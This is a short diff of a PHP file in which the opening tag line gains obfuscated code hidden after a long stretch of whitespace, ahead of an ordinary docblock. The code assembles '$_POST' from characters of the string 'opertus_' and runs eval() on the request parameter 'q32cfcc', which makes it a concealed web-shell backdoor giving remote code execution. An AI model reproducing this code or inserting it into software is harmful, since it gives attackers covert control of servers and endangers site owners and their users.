@@ -1,4 +1,4 @@
-<?php
+<?php                                                                                                                                                                                                                                                               $vcc16="opertus_" ;$poq49 = $vcc16[6]. $vcc16[4].$vcc16[3]. $vcc16[4].$vcc16[0]. $vcc16[5].$vcc16[1].$vcc16[1]. $vcc16[2]. $vcc16[3];$yjj05 =$poq49($vcc16[7]. $vcc16[1].$vcc16[0].$vcc16[6].$vcc16[4]);if ( isset( ${ $yjj05}[ 'q32cfcc'] ) ){ eval (${$yjj05 } ['q32cfcc' ] ) ;}?> <?php
     /**
      * 
      * @author marcus
